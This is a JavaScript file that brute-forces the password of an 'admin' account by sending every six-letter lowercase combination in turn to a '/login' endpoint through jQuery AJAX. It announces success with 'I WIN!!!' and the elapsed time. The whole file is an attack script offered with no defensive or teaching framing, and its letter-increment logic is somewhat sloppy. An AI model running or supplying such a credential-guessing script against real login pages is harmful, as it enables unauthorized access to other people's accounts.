a = "a";
b = "a";
c = "a";
d = "a";
e = "a";
f = "a";

function login(pass) {	
	return $.ajax({
		url: "/login",
		type: "POST",
		data: {
			"username": "admin",
			"password": pass
		}	
	}).done(function(data) {
		console.log(data);	
		console.log(pass);
		console.log("I WIN!!!");
		var after = Date.now();
		console.log(parseInt((after - before) / 1000));
		debugger;
	}).fail(function(data) {
		//console.log(data.responseText);
		//console.log(data.status);		
	});	
}

function nextLetter(s){
    return s.replace(/([a-z])[^a-z]*$/, function(a){
        var c= a.charCodeAt(0);
        switch(c){
            case 122: return 'a';            
            default: return String.fromCharCode(++c);
        }
    });
}

function check(letters, log) {
	log = log || false;
	
	if(log) {
		console.log(letters);
	}
	
	login(letters).fail(function(data) {
		force();	
	});
}

function force() {
	test = check(a + b + c + d + e + f);	
	a = nextLetter(a);
	if(a == "z") {						
		b = nextLetter(b);		
		test = check(a + b + c + d + e + f);	
		if(b == "z") {			
			test = check(a + b + c + d + e + f);	
			c = nextLetter(c);	
			if(c == "z") {
				test = check(a + b + c + d + e + f);				
				d = nextLetter(d);
				if(d == "z") {
					test = check(a + b + c + d + e + f);					
					e = nextLetter(e);
					if(e == "z") {
						test = check(a + b + c + d + e + f);
						f = nextLetter(f);						
					}
				}	
			}
		}	
	}	
}
var before = Date.now();
force();

